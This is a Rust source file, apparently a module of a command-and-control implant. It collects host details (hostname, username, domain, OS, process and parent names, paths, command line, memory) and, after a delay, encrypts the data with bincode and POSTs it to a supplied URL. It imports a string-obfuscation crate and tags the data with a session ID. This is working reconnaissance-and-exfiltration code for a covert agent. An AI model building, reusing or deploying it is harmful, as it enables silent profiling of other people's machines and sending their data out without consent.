use serde::{Deserialize, Serialize};
use sysinfo::System;
use std::process;
use obfstr::obfstr;

use crate::link_util::bytes_to_gigabytes_string;
use crate::link_util::cmdline;
use crate::link_util::get_domain_name;
use crate::link_util::process_name_and_parent;
use crate::link_util::process_path;
use crate::link_util::working_dir;

use std::time::Duration;
use std::thread;

use collected_data::POD;


fn collector(session_id: &String) -> POD {
    // TODO attendre 5 minutes
    let sys: System = System::new_all();
    let (process_name, parent_name, ppid) = process_name_and_parent(&sys);
    let process_path: String = process_path();

    let mut post_data: POD = POD {
        session_id: session_id.to_string(),
        hostname: whoami::devicename(),
        username: whoami::username(),
        domain: get_domain_name(),
        arch: whoami::arch().to_string(),
        distro: whoami::distro(),
        desktop_env: whoami::desktop_env().to_string(),
        pid: process::id(),
        ppid: ppid,
        process_name: process_name,
        process_path: process_path,
        working_dir: working_dir(),
        cmdline: cmdline(),
        parent_name: parent_name,
        total_memory: bytes_to_gigabytes_string(sys.total_memory()),
        used_memory: bytes_to_gigabytes_string(sys.used_memory()),
        nb_cpu: sys.cpus().len(),
    };
    return post_data
}

use encryptor::encrypt;


fn send(url: String, data:POD) -> Result<(), anyhow::Error> {
    // Sérialisation bincode → Vec<u8>
    let encoded: Vec<u8> = bincode::serialize(&data)?;
    let encrypted: Vec<u8> = encrypt(encoded);
    
    println!("\nencoded");

    // Envoi en HTTP POST
    let client = reqwest::blocking::Client::new();
    let response = client
        .post(url)
        .header("Content-Type", "application/octet-stream")
        .body(encrypted)
//        .body(encoded)
//        .body("coucou".to_string())
        .send()?;

    println!("Status: {}", response.status());
    return Ok(())

}


fn wait_seconds(seconds: u64) {
    for i in 0..seconds {
        let remaining = seconds - i;
        println!("Reste : {}m {:02}s", remaining / 60, remaining % 60);
        thread::sleep(Duration::from_secs(1));
    }
    println!("Terminé !");
}


pub fn collect_and_send(wait: u64,session_id: String , url: String){
    wait_seconds(wait);
    let post_data :POD = collector(&session_id);
    print!("{:#}", post_data);
    if let Err(e) = send(url, post_data) {
        eprintln!("Erreur envoi: {e}");
    }}
